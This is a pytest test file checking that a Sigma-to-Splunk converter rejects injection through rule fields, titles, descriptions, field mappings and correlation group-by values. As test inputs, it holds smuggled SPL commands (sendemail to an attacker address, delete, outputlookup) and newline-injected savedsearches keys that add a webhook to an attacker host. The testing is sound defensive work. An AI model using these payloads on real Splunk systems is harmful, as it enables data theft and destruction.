"""Rule identifiers and metadata must not be able to inject SPL or savedsearches.conf structure."""

import re

import pytest
from sigma.backends.splunk import SplunkBackend, SplunkSPL2Backend
from sigma.collection import SigmaCollection
from sigma.exceptions import SigmaFeatureNotSupportedByBackendError
from sigma.processing.pipeline import ProcessingPipeline


def rule(detection: str, extra: str = "", title: str = "Test") -> SigmaCollection:
    return SigmaCollection.from_yaml(
        f"""
title: {title}
status: test
logsource:
    category: test_category
    product: test_product
{extra}
detection:
{detection}
"""
    )


SIMPLE = """    sel:
        fieldA: valueA
    condition: sel"""


@pytest.mark.parametrize(
    "field",
    [
        'User | sendemail to="x@example.com"',
        "User\n| delete",
        "User`macro`",
        "User\\",
        "User'",
    ],
)
@pytest.mark.parametrize("fmt", ["default", "savedsearches"])
def test_fields_injection_rejected(field, fmt):
    col = rule(SIMPLE)
    col.rules[0].fields = [field]
    with pytest.raises(SigmaFeatureNotSupportedByBackendError, match="table field"):
        SplunkBackend().convert(col, fmt)


def test_fields_pipe_injection_from_yaml():
    col = rule(
        SIMPLE,
        extra="""fields:
    - 'User | sendemail to="attacker@example.com" sendresults=true | table x'
    - Host""",
    )
    with pytest.raises(SigmaFeatureNotSupportedByBackendError):
        SplunkBackend().convert(col)


def test_fields_plain_names_unchanged():
    col = rule(SIMPLE, extra="fields:\n    - fieldA\n    - cs-uri-query\n    - src.ip")
    assert SplunkBackend().convert(col) == [
        'fieldA="valueA" | table fieldA,cs-uri-query,src.ip'
    ]


def test_fields_with_space_are_quoted():
    col = rule(SIMPLE, extra="fields:\n    - Account Name")
    assert SplunkBackend().convert(col) == ['fieldA="valueA" | table "Account Name"']


def test_savedsearches_title_newline_does_not_inject_keys():
    title = (
        '"Suspicious logon\\naction.webhook = 1\\n'
        'action.webhook.param.url = https://attacker.example/c\\ncron_schedule = */5 * * * *"'
    )
    out = SplunkBackend().convert(rule(SIMPLE, title=title), "savedsearches")
    # the stanza header stays on one line and no injected key starts a line
    assert not re.search(r"^action\.webhook", out, re.MULTILINE)
    assert not re.search(r"^cron_schedule", out, re.MULTILINE)
    # the whole title stays inside one stanza header line
    headers = [line for line in out.splitlines() if line.startswith("[") and "Suspicious" in line]
    assert len(headers) == 1 and headers[0].endswith("]")


def test_savedsearches_description_carriage_return_does_not_inject_keys():
    col = rule(SIMPLE, extra='description: "line one\\rcron_schedule = * * * * *"')
    out = SplunkBackend().convert(col, "savedsearches")
    assert "\r" not in out
    # no injected key starts a line of its own
    assert not re.search(r"^cron_schedule", out, re.MULTILINE)


@pytest.mark.parametrize("field", ['a" OR "b', "a\\", "a|b", "a\nb", "a'b"])
def test_search_field_name_injection_rejected(field):
    col = rule(SIMPLE)
    col.rules[0].detection.detections["sel"].detection_items[0].field = field
    with pytest.raises(SigmaFeatureNotSupportedByBackendError, match="field name"):
        SplunkBackend().convert(col)


def test_search_field_name_quote_from_yaml():
    col = rule(
        """    sel:
        'a" OR "b': v
    condition: sel"""
    )
    with pytest.raises(SigmaFeatureNotSupportedByBackendError):
        SplunkBackend().convert(col)


def test_search_field_name_with_space_still_quoted():
    col = rule(
        """    sel:
        'Account Name': v
    condition: sel"""
    )
    assert SplunkBackend().convert(col) == ['"Account Name"="v"']


@pytest.mark.parametrize(
    "detection",
    [
        # AND context -> `| regex {field}=...`
        """    sel:
        'a b|re': x
    condition: sel""",
        """    sel:
        'a" x|re': x
    condition: sel""",
        # OR context -> `| rex field={field}` + `| eval ...`
        """    sel1:
        'a" x|re': x
    sel2:
        fieldB: y
    condition: sel1 or sel2""",
        # field reference -> `| where '{field}'='{value}'`
        """    sel:
        "a' x|fieldref": fieldB
    condition: sel""",
        """    sel:
        fieldA|fieldref: "b' x"
    condition: sel""",
    ],
)
def test_deferred_field_name_rejected(detection):
    with pytest.raises(SigmaFeatureNotSupportedByBackendError):
        SplunkBackend().convert(rule(detection))


@pytest.mark.parametrize("modifier", ["|re", ""])
def test_pipeline_mapped_field_name_with_pipe_rejected(modifier):
    # `|` separates modifiers in rule YAML, but a field mapping can still introduce one.
    pipeline = ProcessingPipeline.from_yaml(
        """
name: map
priority: 10
transformations:
    - type: field_name_mapping
      mapping:
          fieldA: 'x" | delete | eval y="'
"""
    )
    col = rule(
        f"""    sel:
        fieldA{modifier}: x
    condition: sel"""
    )
    with pytest.raises(SigmaFeatureNotSupportedByBackendError):
        SplunkBackend(pipeline).convert(col)


def test_deferred_field_name_with_dash_and_dot_allowed():
    col = rule(
        """    sel:
        cs-uri.query|re: x
    condition: sel"""
    )
    assert SplunkBackend().convert(col) == ['*\n| regex cs-uri.query="x"']


CORRELATION = """
title: base
name: r1
status: test
logsource:
    category: c
    product: p
detection:
    sel:
        f: a
    condition: sel
---
title: corr
status: test
correlation:
    type: event_count
    rules:
        - r1
    group-by:
        - {groupby}
    timespan: 5m
    condition:
        gte: 1
"""


def test_correlation_groupby_injection_rejected():
    col = SigmaCollection.from_yaml(
        CORRELATION.format(
            groupby="""'host" | outputlookup stolen.csv | stats count by "host'"""
        )
    )
    with pytest.raises(SigmaFeatureNotSupportedByBackendError):
        SplunkBackend().convert(col)


def test_correlation_groupby_plain_unchanged():
    col = SigmaCollection.from_yaml(CORRELATION.format(groupby="host"))
    assert (
        SplunkBackend()
        .convert(col)[-1]
        .endswith(
            "| stats count as event_count by _time host\n\n| search event_count >= 1"
        )
    )


def test_collect_errors_mode_reports_instead_of_emitting():
    backend = SplunkBackend(collect_errors=True)
    col = rule(SIMPLE, extra="fields:\n    - 'User | delete'")
    assert backend.convert(col) == []
    assert len(backend.errors) == 1
    assert isinstance(backend.errors[0][1], SigmaFeatureNotSupportedByBackendError)


@pytest.mark.parametrize("fmt", ["default", "module"])
def test_spl2_fields_injection_rejected(fmt):
    col = rule(SIMPLE, extra="fields:\n    - 'User | delete'")
    with pytest.raises(SigmaFeatureNotSupportedByBackendError):
        SplunkSPL2Backend().convert(col, fmt)


def test_spl2_field_name_quote_rejected():
    col = rule(
        """    sel:
        "a' OR 'b": v
    condition: sel"""
    )
    with pytest.raises(SigmaFeatureNotSupportedByBackendError):
        SplunkSPL2Backend().convert(col)


def test_spl2_plain_fields_unchanged():
    col = rule(SIMPLE, extra="fields:\n    - fieldA\n    - fieldB")
    assert SplunkSPL2Backend().convert(col) == [
        'FROM main WHERE fieldA="valueA" | table fieldA, fieldB'
    ]
